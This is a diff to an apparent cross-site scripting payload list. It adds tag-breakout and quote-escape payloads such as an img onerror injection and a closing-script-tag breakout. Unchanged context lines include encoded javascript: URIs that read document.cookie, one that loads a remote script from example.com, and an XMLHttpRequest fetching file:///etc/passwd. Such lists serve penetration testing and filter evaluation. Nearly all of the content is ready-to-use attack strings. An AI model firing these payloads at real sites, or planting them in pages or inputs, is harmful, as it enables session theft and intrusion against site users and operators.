@@ -5,6 +5,11 @@
 <input onfocus=alert(1)>
 <input onblur=alert(1)>
 <svg o<script>nload=alert(1)>
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+
+
 
 
 
@@ -41,6 +46,8 @@ javas%0a%0dcript%3aalert(1)
 j%0aavascript://www.hackdog.me/%0a%0dprompt(document.cookie)
 javascript://www.hackdog.me/%0a%0dprompt(document.cookie)
 javascript://www.hackdog.me/%0a%0d%28function%28s%29%7B
+'-alert(1)-'
+\'-alert(1)//
  s.src%3D%27http%3A%2f%2fexample.com%2f1.js%27%3B
  document.body.appendChild%28s%29%7D%29%28
  document.createElement%28%27script%27%29%29
@@ -52,6 +59,7 @@ oReq.addEventListener(%22load%22%2C%20reqListener)%3B%0A
 oReq.open(%22GET%22%2C%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22)%3B%0A
 oReq.send()%3B
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
+Exemplo:
 https://vulnerabledoma.in/bypass/dom_redirect#javascript:alert(2)
 
 
